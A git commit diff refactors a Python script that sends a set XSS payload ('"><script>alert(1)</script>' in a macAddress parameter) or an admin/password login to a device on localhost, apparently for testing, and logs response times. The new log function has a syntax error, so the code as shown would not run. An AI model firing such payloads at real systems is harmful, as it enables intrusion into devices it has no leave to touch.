53d838e4b1bd21275ee011f476173bc7cb565b8a
Jami Laamanen <jamilaamanen@gmail.com>
2020-05-07 10:15:02 -0400

    Refactored to use Requests, added response time logging

--- test_script.py
+++ test_script.py
@@ -1,31 +1,37 @@
 # Sends a predefined XSS/login HTTP-request to localhost.
 
 import argparse
-import urllib.parse
-import urllib.request
 import ssl
-ssl._create_default_https_context = ssl._create_unverified_context
+import requests
+import warnings
+warnings.filterwarnings("ignore", message="Unverified HTTPS request is being made to host 'localhost'")
+
+# Write a time to a file
+def log(file_name, time)
+  f = open(file_name, "a")
+  f.write(time + "\n")
+  f.close()
 
 # Login to the device
 def login(url):
   url = url + '/login.php'
-  params = {'username' : 'admin',
+  headers = {'username' : 'admin',
     'password' : 'password',
-    'id' : '870406' }
+    'id' : '123456' }
 
-  data = urllib.parse.urlencode(params)
-  data = data.encode('ascii')
-  r = urllib.request.urlopen(url, data=data)
-  print('Response from the server: ' + str(r.status))
+  r = requests.post(url, headers=headers, verify=False)
+  print('Response from the server: ' + str(r.status_code))
+  print('Response time: ' + str(r.elapsed))
+  log("login.txt", r.elapsed)
 
 # Send the attack
 def attack(url):
   payload = '?/boardData103?macAddress="><script>alert(1)</script>'
-  try:
-    r = urllib.request.urlopen(url + payload)
-    print('Response from the server: ' + str(r.status))
-  except urllib.error.HTTPError as e:
-    print('Error, response from the server: ' + str(e.status))
+
+  r = requests.get(url + payload, verify=False)
+  print('Response from the server: ' + str(r.status_code))
+  print('Response time: ' + str(r.elapsed))
+  log("attack.txt", r.elapsed)
     
 # Parse url, read args and execute the script
 def main():
@@ -34,15 +40,16 @@ def main():
   else:
     url = 'http://localhost:' + str(args.port)
 
-  if args.mode == 'xss':
-    attack(url)
-  else:
-    login(url)
+  for x in range(args.repeats):
+    if args.mode == 'xss':
+      attack(url)
+    else:
+      login(url)
 
 # Define the command line parser     
 if __name__ == "__main__":
   parser = argparse.ArgumentParser(
-    description='Sends a predefined XSS/login -script to localhost.')
+    description='Sends a predefined XSS/login -script to localhost and records response times.')
   parser.add_argument('mode',
     type=str,
     choices=['xss', 'login'],
@@ -53,7 +60,14 @@ if __name__ == "__main__":
   parser.add_argument(
     '--https',
     action='store_true',
-    help='Sets HTTPS when loggin in.')
+    help='Sets HTTPS when logging in.')
+  parser.add_argument('-r',
+    type=int,
+    default=1,
+    action='store',
+    dest='repeats',
+    help='Repeats the request a specified number of time')
+
   args = parser.parse_args()
 
   main()
